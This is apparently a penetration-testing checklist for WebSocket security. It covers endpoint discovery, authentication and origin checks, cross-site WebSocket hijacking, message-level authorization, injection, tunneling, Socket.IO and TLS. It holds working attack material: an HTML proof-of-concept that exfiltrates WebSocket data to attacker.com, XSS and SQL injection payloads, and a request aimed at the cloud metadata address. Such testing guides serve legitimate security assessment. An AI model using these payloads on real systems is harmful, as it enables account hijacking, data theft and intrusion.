# WebSocket Security Testing

## Objective

Identify security vulnerabilities specific to WebSocket connections — including authentication bypass, missing authorization on WebSocket messages, cross-site WebSocket hijacking (CSWSH), injection attacks via WebSocket data, and lack of input validation.

---

## 1. Identify WebSocket Endpoints

```bash
# Check page source for WebSocket connections
curl -s https://target/ | grep -iE "ws://|wss://|WebSocket|new WebSocket"

# Check JavaScript files
for JS in $(curl -s https://target/ | grep -oE 'src="[^"]+\.js"' | cut -d'"' -f2); do
  curl -s "https://target$JS" | grep -iE "WebSocket|ws:/|wss:/" | head -5
done

# Common WebSocket paths
for PATH in /ws /websocket /socket.io /cable /ws/v1 /api/ws /realtime; do
  curl -si "https://target$PATH" \
    -H "Upgrade: websocket" \
    -H "Connection: Upgrade" | grep -iE "upgrade|websocket|HTTP"
done
```

---

## 2. Authentication Testing

### 2.1 Unauthenticated WebSocket Connection
```bash
# Connect without authentication token
# Using wscat (npm install -g wscat)
wscat -c wss://target/ws --no-check

# Using curl
curl -si "https://target/ws" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" | grep -iE "HTTP|upgrade|switching"
```

### 2.2 Authentication via Origin vs Token
Some WebSocket implementations check only the `Origin` header — not a session token:

```bash
# Connect with valid Origin but no session cookie
wscat -c wss://target/ws \
  -H "Origin: https://target.com" \
  --no-check

# Connect with session cookie
wscat -c wss://target/ws \
  -H "Cookie: session=VALID_TOKEN" \
  -H "Origin: https://target.com"
```

---

## 3. Cross-Site WebSocket Hijacking (CSWSH)

Exploits when WebSocket server accepts connections based only on `Origin` and uses cookies for auth.

### 3.1 Detection
```bash
# Check if connection is accepted from arbitrary origin with cookies
curl -si "https://target/ws" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=USER_TOKEN" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" | grep -iE "101|upgrade|switching|403"
```

**Vulnerable** if HTTP 101 Switching Protocols is returned (connection accepted from evil.com).

### 3.2 CSWSH PoC

```html
<!-- cswsh_poc.html — attacker's page -->
<html>
<body>
<script>
  // Victim browser sends cookies automatically with WebSocket
  var ws = new WebSocket('wss://TARGET/ws');

  ws.onopen = function() {
    console.log('Connected');
    ws.send(JSON.stringify({"action": "get_profile"}));
  };

  ws.onmessage = function(event) {
    // Send stolen data to attacker's server
    console.log('Message:', event.data);
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(event.data));
  };
</script>
</body>
</html>
```

---

## 4. Message-Level Authorization

After connecting, test if the server enforces authorization per-message:

```bash
# Using wscat to send test messages
wscat -c wss://target/ws -H "Cookie: session=USER_TOKEN"

# Once connected, send:
{"action": "getUser", "userId": "USER_B_ID"}
{"action": "adminAction", "command": "listAllUsers"}
{"action": "getConfig"}
{"action": "deleteUser", "userId": "TARGET_USER_ID"}
```

**Vulnerable** if unauthorized actions succeed without server-side role check.

---

## 5. Input Validation — Injection via WebSocket

### 5.1 XSS via WebSocket
```bash
# If WebSocket messages are rendered in the DOM
wscat -c wss://target/ws -H "Cookie: session=USER_TOKEN"

# Send XSS payload via WebSocket message
{"message": "<script>alert(document.domain)</script>"}
{"message": "<img src=x onerror=alert(1)>"}
```

### 5.2 SQL Injection via WebSocket
```bash
# SQL injection in WebSocket message body
{"search": "test' OR '1'='1'--"}
{"userId": "1 OR SLEEP(2)-- -"}
```

### 5.3 JSON Injection / Smuggling
```bash
# Attempt to inject additional JSON fields
{"action":"getUser","userId":"1","role":"admin"}
{"action":"getUser","userId":"1\",\"isAdmin\":true,\"x\":\""}
```

---

## 6. WebSocket Tunneling (WebSocket-to-HTTP)

Test if WebSocket tunnel can be used to access internal APIs:

```bash
# If application has a WebSocket proxy/tunnel feature
wscat -c wss://target/ws -H "Cookie: session=USER_TOKEN"

# Send HTTP-style request over WebSocket
{"method":"GET","url":"/admin/users","headers":{}}
{"method":"GET","url":"http://169.254.169.254/latest/meta-data/"}
```

---

## 7. Socket.IO Specific Tests

If the application uses Socket.IO:

```bash
# Enumerate Socket.IO events (listen for all events)
# Using Node.js socket.io-client:
# const io = require('socket.io-client');
# const socket = io('https://target', {auth: {token: 'USER_TOKEN'}});
# socket.onAny((event, ...args) => console.log(event, args));

# Test unauthorized events
wscat -c "wss://target/socket.io/?EIO=4&transport=websocket"
# After handshake, emit:
# 42["adminCommand",{"action":"listUsers"}]
# 42["getPrivateData",{"userId":"OTHER_USER_ID"}]
```

---

## 8. TLS / Protocol Testing

```bash
# Verify WSS (not WS) is used
curl -si "http://target/ws" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" | grep -iE "HTTP|redirect|location"

# Test if WS (unencrypted) is accessible
wscat -c ws://target/ws --no-check

# Verify TLS configuration for WSS
sslyze --regular target.com:443 | grep -iE "tls|cipher|vulnerable"
```

---

## Evidence to Capture

- WebSocket handshake request and response (HTTP 101 Switching Protocols)
- The CSWSH PoC showing connection from evil.com accepted
- Messages sent and received showing unauthorized data
- Any injection responses showing eval or data manipulation

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| Unauthenticated WebSocket connection | Pass/Fail | High |
| CSWSH — arbitrary origin accepted | Pass/Fail | High |
| Missing message-level authorization | Pass/Fail | High |
| XSS via WebSocket message | Pass/Fail | High |
| SQL injection via WebSocket | Pass/Fail | Critical |
| Unencrypted WS (not WSS) | Pass/Fail | Medium |
